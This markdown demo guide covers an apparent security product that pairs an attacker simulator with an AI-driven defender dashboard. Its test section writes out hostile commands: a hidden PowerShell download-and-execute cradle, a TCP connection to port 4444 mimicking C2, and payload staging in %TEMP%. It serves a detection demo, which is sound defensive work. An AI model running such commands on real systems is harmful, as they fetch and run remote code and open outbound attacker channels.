# 🎯 SentinelOneX V4.0 - Complete Demo Guide

**Date:** November 4, 2025  
**Status:** ✅ Both Apps Running & Ready  

---

## 🚀 Quick Status Check

Both applications are currently running:

```
Attacker App  🔴 → http://127.0.0.1:7860 (Port 7860)
Defender App 🛡️ → http://127.0.0.1:7861 (Port 7861)
```

---

## 📋 Step-by-Step Demo Instructions

### **STEP 1: Activate Sentry (Background Threat Monitor)**

1. Open **Defender app** in browser: http://127.0.0.1:7861
2. Click **"Proactive Sentry Mode"** tab
3. Click **"Activate Sentry"** button
4. ✅ You should see: `"Sentry Mode Activated. Monitoring for threats..."`

**What's happening:**
- Background thread starts monitoring all running processes
- Looks for threat patterns (PowerShell cradle, File staging, C2, etc.)
- When detected, adds threat to a queue for UI to process

---

### **STEP 2: Launch a Threat from Attacker App**

1. Open **Attacker app** in ANOTHER browser tab: http://127.0.0.1:7860
2. Select an attack type:
   - ✅ **"Fileless Attack (PowerShell Cradle)"** (Best for demo - most dramatic)
   - Or try: Registry Persistence, File Staging, Network C2
3. Click **"🚀 LAUNCH ATTACK"** button
4. ✅ You'll see: `"✅ ATTACK LAUNCHED"` with a PID

**What's happening:**
- Real PowerShell/CMD process spawns with threat indicators
- Sentry immediately detects it and queues it for analysis

---

### **STEP 3: Stream Threats to Mission Control**

1. Go back to **Defender app** tab
2. Ensure you're on **"Real End-to-End Remediation"** tab
3. **Click "👁️ Watch for Sentry Threats"** button ← THIS IS KEY!
4. 🎬 Watch the Mission Control log stream in real-time:

```
[SENTRY DETECTION] ✅ Threat intercepted by Sentry!
[SENTRY] PID: 12345
[SENTRY] Type: powershell.exe
[1/5] Processing threat with AI analysis...
[2/5] Sending to V1 Analyst AI (Flash)...
[SUCCESS] V1 Analyst (gemini_flash) report received.
[3/5] Sending to V3 Expert AI (Pro)...
[SUCCESS] V3 Expert (gemini_pro) playbook received.
[METRICS] Threat Score: 87/100 | Confidence: 95%
[4/5] ✅ Analysis complete. Awaiting human approval...
```

---

### **STEP 4: Review Analysis & Make Decision**

1. **Expand "📋 V1 Analyst Report"** to see:
   - Executive-friendly threat summary (1 sentence)
   - MITRE technique ID
   - 3 simple remediation steps

2. **Expand "🎯 V3 Expert Playbook"** to see:
   - Machine-readable JSON playbook
   - Specific commands (kill_process, quarantine_file, etc.)
   - Priority levels

3. **Two Options:**
   - Click **"✅ Approve Remediation Plan"** → Watch execution logs stream
   - Click **"❌ Deny Plan"** → No action taken

---

### **STEP 5: Monitor Metrics**

1. Click **"📊 Incident Metrics & Audit Log"** tab
2. Click **"🔄 Refresh Metrics"** button
3. See beautiful markdown table:

```
| Metric                | Value        |
|-----------------------|--------------|
| Total Incidents       | 1            |
| Successful Responses  | 1 ✅         |
| Failed Responses      | 0 ❌         |
| Success Rate          | 100.0%       |
| Approval Rate         | 100.0%       |
| Approved Plans        | 1 ✓          |
| Denied Plans          | 0 ✗          |

Threat Distribution:
- powershell.exe: 1 detected
```

---

## 🧪 Quick Test Commands

**Open a PowerShell and run to test threat detection:**

```powershell
# Test 1: Fileless Attack (Best demo)
powershell.exe -NoP -WindowStyle Hidden "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/malware.ps1')"

# Test 2: File Staging
cmd.exe /c "echo payload > %TEMP%\staged_malware.bin"

# Test 3: Network C2
powershell.exe -NoP "try { $s = New-Object Net.Sockets.TcpClient; $s.Connect('192.168.1.100', 4444) } catch {}"
```

Then go to Defender UI and click "👁️ Watch for Sentry Threats" to see them appear!

---

## 🔍 Architecture Overview

```
┌─────────────────────┐
│   ATTACKER APP      │
│   (Port 7860)       │
│  🚀 Launch Attack   │
└──────────┬──────────┘
           │ Real Process
           ▼
┌──────────────────────────────────────┐
│     WINDOWS PROCESS LIST             │
│  (powershell.exe, cmd.exe, etc.)     │
└──────────┬───────────────────────────┘
           │ Monitoring (every 1 sec)
           ▼
┌──────────────────────────────────────┐
│   SENTRY (Background Thread)         │
│  • Pattern matching                  │
│  • Behavioral analysis               │
│  • Queue threats                     │
└──────────┬───────────────────────────┘
           │ Threat Queue
           ▼
┌──────────────────────────────────────┐
│   DEFENDER APP (Port 7861)           │
│  • Poll queue on button click        │
│  • Stream to Mission Control UI      │
│  • Run AI analysis (Waterfall)       │
│  • Await human approval              │
└──────────────────────────────────────┘
```

---

## 🎨 UI Features

### **Mission Control Tab**
- ✅ Hero feature: 20-line streaming log
- ✅ Shows threats as detected and analyzed in REAL-TIME
- ✅ Expandable accordions for detailed reports

### **Proactive Sentry Mode Tab**
- ✅ Activate/Deactivate background monitoring
- ✅ Shows Sentry status and logs

### **Security Scan Tab** 
- ✅ Test URLs against MCP Testbench
- ✅ Results in readable markdown (not raw JSON)

### **Metrics & Audit Log Tab**
- ✅ Beautiful markdown table for metrics
- ✅ Complete incident audit trail in JSON
- ✅ Threat distribution analysis

### **Voice Command Tab** (POC)
- ✅ Record audio from microphone
- ✅ Transcribe using OpenRouter Whisper API
- ✅ Ready for integration with threat commands

---

## 🔐 Security Features

| Feature | Status | Benefit |
|---------|--------|---------|
| **Dual-UI Separation** | ✅ | Attacker & Defender in separate apps |
| **AI Waterfall** | ✅ | 4 models cascade if one fails |
| **Real Threat Simulation** | ✅ | Actual PowerShell/CMD processes |
| **Threat Queue** | ✅ | Sentry detection feeds UI |
| **Human Approval Gate** | ✅ | All remediation waits for approval |
| **Metrics Tracking** | ✅ | Complete audit trail for compliance |
| **Multi-threaded** | ✅ | Background monitoring doesn't block UI |

---

## 🚀 Try It Now!

```
1. Both apps running ✅
2. Go to Defender: http://127.0.0.1:7861
3. Click "Activate Sentry" tab
4. Go to Attacker: http://127.0.0.1:7860
5. Launch any attack type
6. Back to Defender → Click "👁️ Watch for Sentry Threats"
7. Watch real-time AI analysis stream! 🎯
```

---

## 📊 What Makes This Impressive

✨ **For Investors:**
- Shows autonomous threat response (no manual intervention)
- Waterfall AI ensures system never fails
- Beautiful UI suitable for presentations
- Real-world threat simulation (not fake alerts)

✨ **For Conference Attendees:**
- Live demo is compelling (side-by-side windows)
- Threats appear in real-time
- AI analysis happens automatically
- Human controls execution (responsible AI)

✨ **For Technical Teams:**
- Multi-agent architecture (V1 Analyst + V3 Expert)
- Scalable threat queue design
- Background Sentry pattern matching
- Extensible playbook system

---

## 🆘 Troubleshooting

**Q: No threats showing in Mission Control?**
A: Make sure to:
1. Click "Activate Sentry" FIRST
2. Launch attack from Attacker app
3. Click "👁️ Watch for Sentry Threats" to poll the queue

**Q: "Port already in use" error?**
A: Kill old Python process: `Get-Process -Name python | Stop-Process -Force`

**Q: AI not responding?**
A: Check API key is set: `echo $env:GOOGLE_API_KEY`

---

**Ready to Demo! 🎬**
